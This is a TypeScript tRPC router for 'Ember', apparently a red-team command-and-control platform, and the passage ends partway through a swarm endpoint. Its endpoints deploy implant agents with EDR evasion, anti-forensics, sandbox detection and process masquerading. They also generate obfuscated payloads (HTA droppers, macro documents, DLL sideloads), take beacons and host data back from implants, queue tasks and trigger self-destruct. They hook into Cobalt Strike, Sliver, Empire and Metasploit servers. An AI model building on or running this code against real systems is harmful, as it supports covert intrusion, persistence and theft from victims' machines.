/**
 * ═══════════════════════════════════════════════════════════════════════════════
 * EMBER AGENT ROUTER — tRPC endpoints for AC3's proprietary agent system
 * ═══════════════════════════════════════════════════════════════════════════════
 */

import { z } from "zod";
import { router, protectedProcedure, publicProcedure } from "../_core/trpc";
import { getDb } from "../db";
import {
  emberAgents, emberTasks, emberBeacons, emberPayloads,
  emberSwarms, emberIntelligence,
} from "../../drizzle/schema";
import { eq, desc, and, sql, inArray, gte, count } from "drizzle-orm";
import {
  EMBER_VERSION, EMBER_CODENAME,
  EMBER_CAPABILITY_CATALOG,
  EMBER_TRAFFIC_PROFILES,
  EMBER_PROFILE_DESCRIPTIONS,
  EMBER_CHANNEL_DESCRIPTIONS,
  generateEmberPayload,
  getEmberAgentManager,
  type EmberProfile,
  type EmberPlatform,
  type EmberChannelType,
  type EmberAutonomyLevel,
  type EmberPayloadFormat,
  type EmberAgentState,
} from "../lib/ember-agent-core";
import { getSafetyEngine } from "../lib/safety-engine";
import { ENV } from "../_core/env";
import { C2Registry } from "../lib/c2-abstraction";

// ─── Shared Zod Schemas ─────────────────────────────────────────────────────

const profileEnum = z.enum(["ghost", "scout", "striker", "sentinel", "hydra"]);
const platformEnum = z.enum(["windows_x64", "windows_x86", "linux_x64", "linux_arm64", "macos_x64", "macos_arm64"]);
const autonomyEnum = z.enum(["manual", "guided", "semi_auto", "full_auto"]);
const channelEnum = z.enum(["https_beacon", "dns_covert", "doh_tunnel", "websocket_stream", "icmp_covert", "smb_named_pipe", "steganography", "p2p_mesh"]);
const stateEnum = z.enum(["initializing", "dormant", "active", "evading", "pivoting", "exfiltrating", "self_destruct", "dead"]);
const payloadFormatEnum = z.enum([
  "powershell_oneliner", "powershell_script", "bash_oneliner", "bash_script",
  "python_stager", "dll_sideload", "msi_installer", "hta_dropper",
  "macro_document", "iso_container", "lnk_shortcut", "service_executable",
  "elf_binary", "shellcode_raw", "bof_module",
]);

export const emberAgentRouter = router({
  // ═══════════════════════════════════════════════════════════════════════════
  // METADATA & CATALOG
  // ═══════════════════════════════════════════════════════════════════════════

  /** Get platform C2 callback URLs from configured infrastructure */
  getC2CallbackUrls: protectedProcedure.query(() => {
    const urls: Array<{ label: string; url: string; protocol: string; framework: string; status: "configured" | "unconfigured" }> = [];

    // Caldera (Cyber C2) — primary C2 framework
    if (ENV.calderaBaseUrl) {
      urls.push({
        label: "Caldera HTTPS",
        url: ENV.calderaBaseUrl,
        protocol: "https",
        framework: "caldera",
        status: "configured",
      });
      // Caldera also exposes HTTP contact on port 8888
      const calderaHost = ENV.calderaBaseUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
      if (calderaHost) {
        urls.push({
          label: "Caldera HTTP (direct)",
          url: `http://${calderaHost}:8888`,
          protocol: "http",
          framework: "caldera",
          status: "configured",
        });
      }
    }

    // Cobalt Strike Team Server
    if (ENV.CS_TEAM_SERVER_URL) {
      urls.push({
        label: "Cobalt Strike",
        url: ENV.CS_TEAM_SERVER_URL,
        protocol: "https",
        framework: "cobaltstrike",
        status: "configured",
      });
    } else {
      urls.push({ label: "Cobalt Strike", url: "", protocol: "https", framework: "cobaltstrike", status: "unconfigured" });
    }

    // Empire C2
    if (ENV.EMPIRE_BASE_URL) {
      urls.push({
        label: "Empire",
        url: ENV.EMPIRE_BASE_URL,
        protocol: "https",
        framework: "empire",
        status: "configured",
      });
    } else {
      urls.push({ label: "Empire", url: "", protocol: "https", framework: "empire", status: "unconfigured" });
    }

    // Sliver C2
    if (ENV.SLIVER_SERVER_URL) {
      urls.push({
        label: "Sliver",
        url: ENV.SLIVER_SERVER_URL,
        protocol: "mtls",
        framework: "sliver",
        status: "configured",
      });
    } else {
      urls.push({ label: "Sliver", url: "", protocol: "mtls", framework: "sliver", status: "unconfigured" });
    }

    // Manjusaka C2
    const manjusakaUrl = process.env.MANJUSAKA_API_URL || process.env.MANJUSAKA_BASE_URL || "";
    if (manjusakaUrl) {
      urls.push({
        label: "Manjusaka",
        url: manjusakaUrl,
        protocol: "https",
        framework: "manjusaka",
        status: "configured",
      });
    } else {
      urls.push({ label: "Manjusaka", url: "", protocol: "https", framework: "manjusaka", status: "unconfigured" });
    }

    // Metasploit handler
    if (ENV.MSF_RPC_HOST) {
      const msfProto = ENV.MSF_RPC_SSL ? "https" : "http";
      urls.push({
        label: "Metasploit",
        url: `${msfProto}://${ENV.MSF_RPC_HOST}:${ENV.MSF_RPC_PORT}`,
        protocol: msfProto,
        framework: "metasploit",
        status: "configured",
      });
    } else {
      urls.push({ label: "Metasploit", url: "", protocol: "https", framework: "metasploit", status: "unconfigured" });
    }

    // Scan Server (can serve as a redirector/relay)
    if (ENV.SCAN_SERVER_HOST) {
      urls.push({
        label: "Scan Server (Redirector)",
        url: `https://${ENV.SCAN_SERVER_HOST}`,
        protocol: "https",
        framework: "redirector",
        status: "configured",
      });
    }

    return urls;
  }),

  /** Get Ember system metadata */
  getMetadata: protectedProcedure.query(() => ({
    version: EMBER_VERSION,
    codename: EMBER_CODENAME,
    profiles: EMBER_PROFILE_DESCRIPTIONS,
    channels: EMBER_CHANNEL_DESCRIPTIONS,
    trafficProfiles: EMBER_TRAFFIC_PROFILES.map(p => ({ id: p.id, name: p.name, description: p.description })),
    capabilityCount: EMBER_CAPABILITY_CATALOG.length,
    capabilityCategories: [...new Set(EMBER_CAPABILITY_CATALOG.map(c => c.category))],
  })),

  /** Get the full capability catalog */
  getCapabilityCatalog: protectedProcedure
    .input(z.object({ category: z.string().optional() }).optional())
    .query(({ input }) => {
      const catalog = EMBER_CAPABILITY_CATALOG;
      if (input?.category) {
        return catalog.filter(c => c.category === input.category);
      }
      return catalog;
    }),

  /** Get traffic profile details */
  getTrafficProfiles: protectedProcedure.query(() => EMBER_TRAFFIC_PROFILES),

  // ═══════════════════════════════════════════════════════════════════════════
  // FLEET MANAGEMENT
  // ═══════════════════════════════════════════════════════════════════════════

  /** Get fleet overview with aggregate stats */
  getFleetOverview: protectedProcedure
    .input(z.object({ engagementId: z.number().optional() }).optional())
    .query(async ({ input }) => {
      const db = await getDb();
      const conditions = input?.engagementId
        ? [eq(emberAgents.engagementId, input.engagementId)]
        : [];

      const agents = await db.select().from(emberAgents)
        .where(conditions.length ? and(...conditions) : undefined)
        .orderBy(desc(emberAgents.updatedAt));

      const byState: Record<string, number> = {};
      const byProfile: Record<string, number> = {};
      const byPlatform: Record<string, number> = {};
      let activeCount = 0;
      let cognitiveCount = 0;
      let totalBeacons = 0;

      for (const a of agents) {
        byState[a.state] = (byState[a.state] || 0) + 1;
        byProfile[a.profile] = (byProfile[a.profile] || 0) + 1;
        byPlatform[a.platform] = (byPlatform[a.platform] || 0) + 1;
        if (a.state === "active" || a.state === "evading" || a.state === "pivoting") activeCount++;
        if (a.cognitiveEnabled) cognitiveCount++;
        totalBeacons += a.beaconCount || 0;
      }

      const [taskStats] = await db.select({
        total: count(),
        pending: sql<number>`SUM(CASE WHEN ${emberTasks.status} = 'pending' THEN 1 ELSE 0 END)`,
        running: sql<number>`SUM(CASE WHEN ${emberTasks.status} = 'running' THEN 1 ELSE 0 END)`,
        success: sql<number>`SUM(CASE WHEN ${emberTasks.status} = 'success' THEN 1 ELSE 0 END)`,
        failed: sql<number>`SUM(CASE WHEN ${emberTasks.status} = 'failed' THEN 1 ELSE 0 END)`,
      }).from(emberTasks);

      const [swarmStats] = await db.select({ total: count() }).from(emberSwarms);
      const [intelStats] = await db.select({ total: count() }).from(emberIntelligence);
      const [payloadStats] = await db.select({ total: count() }).from(emberPayloads);

      return {
        totalAgents: agents.length,
        activeAgents: activeCount,
        cognitiveAgents: cognitiveCount,
        totalBeacons,
        byState,
        byProfile,
        byPlatform,
        tasks: {
          total: taskStats?.total || 0,
          pending: Number(taskStats?.pending) || 0,
          running: Number(taskStats?.running) || 0,
          success: Number(taskStats?.success) || 0,
          failed: Number(taskStats?.failed) || 0,
        },
        swarms: swarmStats?.total || 0,
        intelligence: intelStats?.total || 0,
        payloadsGenerated: payloadStats?.total || 0,
      };
    }),

  /** List all agents with filtering */
  listAgents: protectedProcedure
    .input(z.object({
      engagementId: z.number().optional(),
      state: stateEnum.optional(),
      profile: profileEnum.optional(),
      platform: platformEnum.optional(),
      swarmId: z.string().optional(),
      limit: z.number().min(1).max(200).default(50),
      offset: z.number().min(0).default(0),
    }).optional())
    .query(async ({ input }) => {
      const db = await getDb();
      const conditions: any[] = [];
      if (input?.engagementId) conditions.push(eq(emberAgents.engagementId, input.engagementId));
      if (input?.state) conditions.push(eq(emberAgents.state, input.state));
      if (input?.profile) conditions.push(eq(emberAgents.profile, input.profile));
      if (input?.platform) conditions.push(eq(emberAgents.platform, input.platform));
      if (input?.swarmId) conditions.push(eq(emberAgents.swarmId, input.swarmId));

      const agents = await db.select().from(emberAgents)
        .where(conditions.length ? and(...conditions) : undefined)
        .orderBy(desc(emberAgents.updatedAt))
        .limit(input?.limit || 50)
        .offset(input?.offset || 0);

      return agents;
    }),

  /** Get a single agent's full details */
  getAgent: protectedProcedure
    .input(z.object({ agentId: z.string() }))
    .query(async ({ input }) => {
      const db = await getDb();
      const [agent] = await db.select().from(emberAgents)
        .where(eq(emberAgents.agentId, input.agentId))
        .limit(1);

      if (!agent) return null;

      // Get recent tasks
      const tasks = await db.select().from(emberTasks)
        .where(eq(emberTasks.agentId, input.agentId))
        .orderBy(desc(emberTasks.createdAt))
        .limit(20);

      // Get recent beacons
      const beacons = await db.select().from(emberBeacons)
        .where(eq(emberBeacons.agentId, input.agentId))
        .orderBy(desc(emberBeacons.receivedAt))
        .limit(10);

      // Get intelligence
      const intel = await db.select().from(emberIntelligence)
        .where(eq(emberIntelligence.agentId, input.agentId))
        .orderBy(desc(emberIntelligence.discoveredAt))
        .limit(50);

      // Get cognitive status from manager
      const manager = getEmberAgentManager();
      const cognitiveStatus = manager.getCognitiveStatus(input.agentId);

      return { agent, tasks, beacons, intel, cognitiveStatus };
    }),

  // ═══════════════════════════════════════════════════════════════════════════
  // AGENT LIFECYCLE
  // ═══════════════════════════════════════════════════════════════════════════

  /** Deploy a new Ember agent (creates config + generates payload) */
  deployAgent: protectedProcedure
    .input(z.object({
      name: z.string().min(1).max(255),
      engagementId: z.number().optional(),
      profile: profileEnum,
      platform: platformEnum,
      autonomy: autonomyEnum.default("manual"),
      primaryChannel: channelEnum.default("https_beacon"),
      fallbackChannels: z.array(channelEnum).default([]),
      beaconInterval: z.number().min(5).max(86400).default(60),
      jitterPercent: z.number().min(0).max(50).default(20),
      killDate: z.number().optional(),
      workingHours: z.object({ start: z.number(), end: z.number() }).optional(),
      callbackUrls: z.array(z.string().url()).min(1),
      trafficProfile: z.string().optional(),
      evasion: z.object({
        memoryEncryption: z.boolean().default(true),
        sleepObfuscation: z.boolean().default(true),
        processMasquerade: z.boolean().default(false),
        masqueradeProcess: z.string().optional(),
        trafficMimicry: z.boolean().default(true),
        antiForensics: z.boolean().default(false),
        sandboxDetection: z.boolean().default(true),
        edrEvasion: z.boolean().default(true),
      }).default({}),
      cognitive: z.object({
        enabled: z.boolean().default(false),
        objective: z.string().optional(),
        maxAutonomousActions: z.number().min(0).max(100).default(20),
        riskThreshold: z.number().min(0).max(100).default(50),
        constraints: z.array(z.string()).default([]),
      }).default({}),
      payloadFormat: payloadFormatEnum.default("powershell_script"),
      obfuscationLevel: z.number().min(1).max(5).default(3),
    }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      const now = Date.now();
      const agentId = `ember-${now.toString(36)}-${Math.random().toString(36).slice(2, 10)}`;
      const regToken = `ert-${agentId.slice(0, 12)}-${Math.random().toString(36).slice(2, 14)}`;

      // Safety check if engagement is specified
      if (input.engagementId) {
        const safety = getSafetyEngine(input.engagementId);
        const assessment = safety.assessCommand(
          "ember_deploy", `profile=${input.profile} platform=${input.platform}`,
          input.callbackUrls[0],
        );
        if (!assessment.allowed) {
          return { success: false, error: `Safety engine blocked deployment: ${assessment.reason}`, agentId: null, payload: null };
        }
      }

      // Select capabilities based on profile
      const profileCaps = EMBER_PROFILE_DESCRIPTIONS[input.profile as EmberProfile];
      const selectedModules = EMBER_CAPABILITY_CATALOG.filter(m => {
        if (input.profile === "ghost") return m.category === "c2";
        if (input.profile === "scout") return ["recon", "c2", "cognitive"].includes(m.category);
        if (input.profile === "striker") return true; // All modules
        if (input.profile === "sentinel") return ["persistence", "evasion", "c2"].includes(m.category);
        if (input.profile === "hydra") return ["c2", "recon", "cognitive"].includes(m.category);
        return false;
      });

      // Insert agent record
      await db.insert(emberAgents).values({
        agentId,
        name: input.name,
        engagementId: input.engagementId || null,
        profile: input.profile as any,
        platform: input.platform as any,
        autonomy: input.autonomy as any,
        state: "initializing" as any,
        primaryChannel: input.primaryChannel,
        beaconInterval: input.beaconInterval,
        jitterPercent: input.jitterPercent,
        killDate: input.killDate || null,
        registrationToken: regToken,
        configJson: {
          callbackUrls: input.callbackUrls,
          fallbackChannels: input.fallbackChannels,
          workingHours: input.workingHours,
          evasion: input.evasion,
        },
        loadedModules: selectedModules.map(m => m.id),
        cognitiveEnabled: input.cognitive.enabled ? 1 : 0,
        cognitiveObjective: input.cognitive.objective || null,
        cognitiveActionsMax: input.cognitive.maxAutonomousActions,
        trafficProfile: input.trafficProfile || null,
        evasionScore: profileCaps.stealthRating,
        createdAt: now,
        updatedAt: now,
      });

      // Generate payload
      const payloadOutput = generateEmberPayload({
        platform: input.platform as EmberPlatform,
        format: input.payloadFormat as EmberPayloadFormat,
        profile: input.profile as EmberProfile,
        callback: {
          urls: input.callbackUrls,
          primaryChannel: input.primaryChannel as EmberChannelType,
          fallbackChannels: input.fallbackChannels as EmberChannelType[],
        },
        evasion: {
          obfuscationLevel: input.obfuscationLevel,
          stringEncryption: input.obfuscationLevel >= 3,
          controlFlowObfuscation: input.obfuscationLevel >= 4,
          antiDebugging: input.evasion.sandboxDetection,
          antiVM: input.evasion.sandboxDetection,
          sandboxDetection: input.evasion.sandboxDetection,
          initialSleepMs: 0,
          targetProcess: input.evasion.masqueradeProcess,
        },
        beacon: {
          intervalSeconds: input.beaconInterval,
          jitterPercent: input.jitterPercent,
          killDate: input.killDate,
          workingHours: input.workingHours,
        },
        registrationToken: regToken,
        cognitive: input.cognitive.enabled ? {
          enabled: true,
          objective: input.cognitive.objective || "Assess security posture",
          autonomy: input.autonomy as EmberAutonomyLevel,
          maxActions: input.cognitive.maxAutonomousActions,
          riskThreshold: input.cognitive.riskThreshold,
        } : undefined,
      });

      // Store payload record
      const payloadId = `ep-${now.toString(36)}-${Math.random().toString(36).slice(2, 8)}`;
      await db.insert(emberPayloads).values({
        payloadId,
        engagementId: input.engagementId || null,
        profile: input.profile,
        platform: input.platform,
        format: input.payloadFormat,
        callbackUrls: input.callbackUrls,
        primaryChannel: input.primaryChannel,
        evasionConfig: input.evasion,
        beaconConfig: {
          interval: input.beaconInterval,
          jitter: input.jitterPercent,
          killDate: input.killDate,
        },
        cognitiveConfig: input.cognitive.enabled ? input.cognitive : null,
        registrationToken: regToken,
        filename: payloadOutput.filename,
        hash: payloadOutput.hash,
        size: payloadOutput.size,
        estimatedDetectionRate: payloadOutput.estimatedDetectionRate,
        evasionTechniques: payloadOutput.evasionTechniques,
        capabilities: payloadOutput.capabilities,
        generatedBy: "operator",
        createdAt: now,
      });

      // Register with in-memory manager
      const manager = getEmberAgentManager();
      manager.registerAgent({
        agentId,
        name: input.name,
        profile: input.profile as EmberProfile,
        platform: input.platform as EmberPlatform,
        autonomy: input.autonomy as EmberAutonomyLevel,
        safetyLevel: "standard",
        engagementId: input.engagementId || 0,
        beacon: {
          primaryChannel: input.primaryChannel as EmberChannelType,
          fallbackChannels: input.fallbackChannels as EmberChannelType[],
          intervalSeconds: input.beaconInterval,
          jitterPercent: input.jitterPercent,
          maxMissedBeacons: 5,
          workingHours: input.workingHours,
          killDate: input.killDate,
        },
        evasion: {
          ...input.evasion,
          trafficProfile: input.trafficProfile,
        },
        capabilities: selectedModules,
        network: {
          callbackUrls: input.callbackUrls,
        },
        cognitive: {
          enabled: input.cognitive.enabled,
          maxAutonomousActions: input.cognitive.maxAutonomousActions,
          riskThreshold: input.cognitive.riskThreshold,
          objective: input.cognitive.objective,
          constraints: input.cognitive.constraints || [],
        },
      });

      return {
        success: true,
        error: null,
        agentId,
        payload: {
          payloadId,
          format: payloadOutput.format,
          filename: payloadOutput.filename,
          content: payloadOutput.payload,
          oneLiner: payloadOutput.oneLiner,
          size: payloadOutput.size,
          hash: payloadOutput.hash,
          estimatedDetectionRate: payloadOutput.estimatedDetectionRate,
          evasionTechniques: payloadOutput.evasionTechniques,
          capabilities: payloadOutput.capabilities,
        },
      };
    }),

  /** Terminate an agent */
  terminateAgent: protectedProcedure
    .input(z.object({ agentId: z.string(), cleanTraces: z.boolean().default(true) }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      const now = Date.now();

      // Queue self-destruct task
      await db.insert(emberTasks).values({
        taskId: `et-terminate-${now.toString(36)}`,
        agentId: input.agentId,
        type: "self_destruct",
        priority: 10,
        params: { cleanTraces: input.cleanTraces },
        status: "pending" as any,
        assignedBy: "operator",
        safetyAllowed: 1,
        createdAt: now,
      });

      // Update agent state
      await db.update(emberAgents)
        .set({ state: "self_destruct" as any, updatedAt: now, terminatedAt: now })
        .where(eq(emberAgents.agentId, input.agentId));

      const manager = getEmberAgentManager();
      manager.terminateAgent(input.agentId);

      return { success: true };
    }),

  /** Update agent configuration */
  updateAgent: protectedProcedure
    .input(z.object({
      agentId: z.string(),
      autonomy: autonomyEnum.optional(),
      beaconInterval: z.number().min(5).max(86400).optional(),
      jitterPercent: z.number().min(0).max(50).optional(),
      cognitiveEnabled: z.boolean().optional(),
      cognitiveObjective: z.string().optional(),
      cognitiveActionsMax: z.number().optional(),
      trafficProfile: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      const updates: any = { updatedAt: Date.now() };
      if (input.autonomy) updates.autonomy = input.autonomy;
      if (input.beaconInterval) updates.beaconInterval = input.beaconInterval;
      if (input.jitterPercent !== undefined) updates.jitterPercent = input.jitterPercent;
      if (input.cognitiveEnabled !== undefined) updates.cognitiveEnabled = input.cognitiveEnabled ? 1 : 0;
      if (input.cognitiveObjective) updates.cognitiveObjective = input.cognitiveObjective;
      if (input.cognitiveActionsMax) updates.cognitiveActionsMax = input.cognitiveActionsMax;
      if (input.trafficProfile) updates.trafficProfile = input.trafficProfile;

      await db.update(emberAgents).set(updates).where(eq(emberAgents.agentId, input.agentId));

      // If beacon interval changed, queue a sleep_update task
      if (input.beaconInterval || input.jitterPercent !== undefined) {
        await db.insert(emberTasks).values({
          taskId: `et-sleep-${Date.now().toString(36)}`,
          agentId: input.agentId,
          type: "sleep_update",
          priority: 8,
          params: {
            interval: input.beaconInterval,
            jitter: input.jitterPercent,
          },
          status: "pending" as any,
          assignedBy: "operator",
          safetyAllowed: 1,
          createdAt: Date.now(),
        });
      }

      return { success: true };
    }),

  // ═══════════════════════════════════════════════════════════════════════════
  // BEACON PROCESSING (called by agents)
  // ═══════════════════════════════════════════════════════════════════════════

  /** Process an agent registration (public — called by the agent itself) */
  registerAgent: publicProcedure
    .input(z.object({
      agentId: z.string(),
      name: z.string(),
      token: z.string(),
      hostname: z.string().optional(),
      username: z.string().optional(),
      platform: z.string().optional(),
      profile: z.string().optional(),
      interval: z.number().optional(),
      jitter: z.number().optional(),
      systemInfo: z.any().optional(),
    }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      // Validate registration token
      const [agent] = await db.select().from(emberAgents)
        .where(eq(emberAgents.registrationToken, input.token))
        .limit(1);

      if (!agent) {
        return { success: false, error: "Invalid registration token", agentId: null };
      }

      const now = Date.now();
      const sysInfo = input.systemInfo || {};

      await db.update(emberAgents).set({
        state: "active" as any,
        hostname: input.hostname || sysInfo.hostname || null,
        username: input.username || sysInfo.username || null,
        osVersion: sysInfo.osVersion || null,
        architecture: sysInfo.architecture || null,
        isElevated: sysInfo.isElevated ? 1 : 0,
        integrity: sysInfo.integrity || "medium",
        pid: sysInfo.pid || null,
        processName: sysInfo.processName || null,
        internalIp: sysInfo.networkInterfaces?.[0]?.ipv4 || null,
        systemInfoJson: sysInfo,
        securityProducts: sysInfo.securityProducts || null,
        lastBeaconAt: now,
        beaconCount: 1,
        updatedAt: now,
      }).where(eq(emberAgents.agentId, agent.agentId));

      return { success: true, agentId: agent.agentId, error: null };
    }),

  /** Process an agent beacon (public — called by the agent itself) */
  processBeacon: publicProcedure
    .input(z.object({
      agentId: z.string(),
      sequence: z.number().optional(),
      state: z.string().optional(),
      timestamp: z.number().optional(),
      channel: z.string().optional(),
      systemInfo: z.any().optional(),
      taskResults: z.array(z.any()).optional(),
      intelligence: z.array(z.any()).optional(),
    }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      const now = Date.now();

      // Verify agent exists
      const [agent] = await db.select().from(emberAgents)
        .where(eq(emberAgents.agentId, input.agentId))
        .limit(1);

      if (!agent) return { tasks: [], error: "Unknown agent" };

      // Record beacon
      await db.insert(emberBeacons).values({
        agentId: input.agentId,
        sequence: input.sequence || 0,
        state: input.state || "active",
        channel: input.channel || "https_beacon",
        systemInfoJson: input.systemInfo || null,
        intelligenceJson: input.intelligence || null,
        taskResultsJson: input.taskResults || null,
        receivedAt: now,
      });

      // Update agent state
      await db.update(emberAgents).set({
        state: (input.state || "active") as any,
        lastBeaconAt: now,
        beaconCount: (agent.beaconCount || 0) + 1,
        missedBeacons: 0,
        updatedAt: now,
      }).where(eq(emberAgents.agentId, input.agentId));

      // Process task results
      if (input.taskResults?.length) {
        for (const result of input.taskResults) {
          if (result.taskId) {
            await db.update(emberTasks).set({
              status: result.status || "success",
              output: result.output?.slice(0, 65000) || null,
              error: result.error || null,
              durationMs: result.durationMs || null,
              completedAt: now,
            }).where(eq(emberTasks.taskId, result.taskId));
          }
        }
      }

      // Process intelligence
      if (input.intelligence?.length) {
        for (const intel of input.intelligence) {
          await db.insert(emberIntelligence).values({
            agentId: input.agentId,
            engagementId: agent.engagementId || null,
            type: intel.type || "host_discovery",
            confidence: intel.confidence || 50,
            dataJson: intel.data || intel,
            sharedWithSwarm: 0,
            discoveredAt: now,
          });
        }
      }

      // Get pending tasks for this agent
      const pendingTasks = await db.select().from(emberTasks)
        .where(and(
          eq(emberTasks.agentId, input.agentId),
          eq(emberTasks.status, "pending"),
        ))
        .orderBy(desc(emberTasks.priority))
        .limit(10);

      // Mark tasks as sent
      if (pendingTasks.length) {
        const taskIds = pendingTasks.map(t => t.taskId);
        await db.update(emberTasks)
          .set({ status: "sent" as any, sentAt: now })
          .where(inArray(emberTasks.taskId, taskIds));
      }

      return {
        tasks: pendingTasks.map(t => ({
          taskId: t.taskId,
          type: t.type,
          priority: t.priority,
          params: t.params || {},
          attackTechnique: t.attackTechnique,
          timeoutSeconds: t.timeoutSeconds,
        })),
        error: null,
      };
    }),

  /** Submit task result (public — called by the agent itself) */
  submitResult: publicProcedure
    .input(z.object({
      taskId: z.string(),
      agentId: z.string(),
      status: z.string(),
      output: z.string().optional(),
      error: z.string().optional(),
      durationMs: z.number().optional(),
      artifacts: z.array(z.any()).optional(),
    }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      await db.update(emberTasks).set({
        status: (input.status as any) || "success",
        output: input.output?.slice(0, 65000) || null,
        error: input.error || null,
        durationMs: input.durationMs || null,
        artifactsJson: input.artifacts || null,
        completedAt: Date.now(),
      }).where(eq(emberTasks.taskId, input.taskId));

      return { success: true };
    }),

  // ═══════════════════════════════════════════════════════════════════════════
  // TASK MANAGEMENT
  // ═══════════════════════════════════════════════════════════════════════════

  /** Queue a task for an agent */
  queueTask: protectedProcedure
    .input(z.object({
      agentId: z.string(),
      type: z.string(),
      params: z.record(z.any()).default({}),
      priority: z.number().min(1).max(10).default(5),
      attackTechnique: z.string().optional(),
      timeoutSeconds: z.number().min(5).max(3600).default(300),
      requiresElevation: z.boolean().default(false),
    }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      const now = Date.now();
      const taskId = `et-${now.toString(36)}-${Math.random().toString(36).slice(2, 8)}`;

      // Safety check
      const [agent] = await db.select().from(emberAgents)
        .where(eq(emberAgents.agentId, input.agentId))
        .limit(1);

      let safetyAllowed = 1;
      let safetyRiskScore = 0;
      let safetyReason = "No engagement context";

      if (agent?.engagementId) {
        const safety = getSafetyEngine(agent.engagementId);
        const assessment = safety.assessCommand(
          input.type,
          JSON.stringify(input.params),
          agent.hostname || "unknown",
        );
        safetyAllowed = assessment.allowed ? 1 : 0;
        safetyRiskScore = assessment.blastRadius.riskScore;
        safetyReason = assessment.reason;

        if (!assessment.allowed) {
          // Still record the task but mark it blocked
          await db.insert(emberTasks).values({
            taskId,
            agentId: input.agentId,
            engagementId: agent.engagementId,
            type: input.type,
            priority: input.priority,
            params: input.params,
            attackTechnique: input.attackTechnique || null,
            timeoutSeconds: input.timeoutSeconds,
            requiresElevation: input.requiresElevation ? 1 : 0,
            assignedBy: "operator",
            safetyAllowed: 0,
            safetyRiskScore,
            safetyReason,
            status: "blocked" as any,
            createdAt: now,
          });

          return { success: false, taskId, error: `Safety blocked: ${safetyReason}`, blocked: true };
        }
      }

      await db.insert(emberTasks).values({
        taskId,
        agentId: input.agentId,
        engagementId: agent?.engagementId || null,
        type: input.type,
        priority: input.priority,
        params: input.params,
        attackTechnique: input.attackTechnique || null,
        timeoutSeconds: input.timeoutSeconds,
        requiresElevation: input.requiresElevation ? 1 : 0,
        assignedBy: "operator",
        safetyAllowed,
        safetyRiskScore,
        safetyReason,
        status: "pending" as any,
        createdAt: now,
      });

      return { success: true, taskId, error: null, blocked: false };
    }),

  /** Get tasks for an agent */
  getAgentTasks: protectedProcedure
    .input(z.object({
      agentId: z.string(),
      status: z.string().optional(),
      limit: z.number().min(1).max(200).default(50),
    }))
    .query(async ({ input }) => {
      const db = await getDb();
      const conditions = [eq(emberTasks.agentId, input.agentId)];
      if (input.status) conditions.push(eq(emberTasks.status, input.status as any));

      return db.select().from(emberTasks)
        .where(and(...conditions))
        .orderBy(desc(emberTasks.createdAt))
        .limit(input.limit);
    }),

  // ═══════════════════════════════════════════════════════════════════════════
  // PAYLOAD MANAGEMENT
  // ═══════════════════════════════════════════════════════════════════════════

  /** Generate a new payload for an existing agent */
  generatePayload: protectedProcedure
    .input(z.object({
      agentId: z.string(),
      format: payloadFormatEnum,
      obfuscationLevel: z.number().min(1).max(5).default(3),
      antiDebugging: z.boolean().default(true),
      sandboxDetection: z.boolean().default(true),
      initialSleepMs: z.number().min(0).max(600000).default(0),
    }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      const [agent] = await db.select().from(emberAgents)
        .where(eq(emberAgents.agentId, input.agentId))
        .limit(1);

      if (!agent) return { success: false, error: "Agent not found", payload: null };

      const config = (agent.configJson || {}) as any;
      const callbackUrls = config.callbackUrls || ["https://localhost"];

      const payloadOutput = generateEmberPayload({
        platform: agent.platform as EmberPlatform,
        format: input.format as EmberPayloadFormat,
        profile: agent.profile as EmberProfile,
        callback: {
          urls: callbackUrls,
          primaryChannel: (agent.primaryChannel || "https_beacon") as EmberChannelType,
          fallbackChannels: (config.fallbackChannels || []) as EmberChannelType[],
        },
        evasion: {
          obfuscationLevel: input.obfuscationLevel,
          stringEncryption: input.obfuscationLevel >= 3,
          controlFlowObfuscation: input.obfuscationLevel >= 4,
          antiDebugging: input.antiDebugging,
          antiVM: input.sandboxDetection,
          sandboxDetection: input.sandboxDetection,
          initialSleepMs: input.initialSleepMs,
        },
        beacon: {
          intervalSeconds: agent.beaconInterval || 60,
          jitterPercent: agent.jitterPercent || 20,
          killDate: agent.killDate || undefined,
        },
        registrationToken: agent.registrationToken || "",
      });

      const now = Date.now();
      const payloadId = `ep-${now.toString(36)}-${Math.random().toString(36).slice(2, 8)}`;

      await db.insert(emberPayloads).values({
        payloadId,
        engagementId: agent.engagementId || null,
        profile: agent.profile,
        platform: agent.platform,
        format: input.format,
        callbackUrls,
        primaryChannel: agent.primaryChannel,
        evasionConfig: { obfuscationLevel: input.obfuscationLevel, antiDebugging: input.antiDebugging, sandboxDetection: input.sandboxDetection },
        beaconConfig: { interval: agent.beaconInterval, jitter: agent.jitterPercent },
        registrationToken: agent.registrationToken,
        filename: payloadOutput.filename,
        hash: payloadOutput.hash,
        size: payloadOutput.size,
        estimatedDetectionRate: payloadOutput.estimatedDetectionRate,
        evasionTechniques: payloadOutput.evasionTechniques,
        capabilities: payloadOutput.capabilities,
        generatedBy: "operator",
        createdAt: now,
      });

      return {
        success: true,
        error: null,
        payload: {
          payloadId,
          format: payloadOutput.format,
          filename: payloadOutput.filename,
          content: payloadOutput.payload,
          oneLiner: payloadOutput.oneLiner,
          size: payloadOutput.size,
          hash: payloadOutput.hash,
          estimatedDetectionRate: payloadOutput.estimatedDetectionRate,
          evasionTechniques: payloadOutput.evasionTechniques,
        },
      };
    }),

  /** List generated payloads */
  listPayloads: protectedProcedure
    .input(z.object({
      engagementId: z.number().optional(),
      limit: z.number().min(1).max(100).default(20),
    }).optional())
    .query(async ({ input }) => {
      const db = await getDb();
      const conditions: any[] = [];
      if (input?.engagementId) conditions.push(eq(emberPayloads.engagementId, input.engagementId));

      return db.select().from(emberPayloads)
        .where(conditions.length ? and(...conditions) : undefined)
        .orderBy(desc(emberPayloads.createdAt))
        .limit(input?.limit || 20);
    }),

  // ═══════════════════════════════════════════════════════════════════════════
  // SWARM MANAGEMENT
  // ═══════════════════════════════════════════════════════════════════════════

  /** Create a new swarm from existing agents */
  createSwarm: protectedProcedure
    .input(z.object({
      name: z.string().min(1).max(255),
      engagementId: z.number().optional(),
      coordinatorAgentId: z.string(),
      memberAgentIds: z.array(z.string()).min(1),
    }))
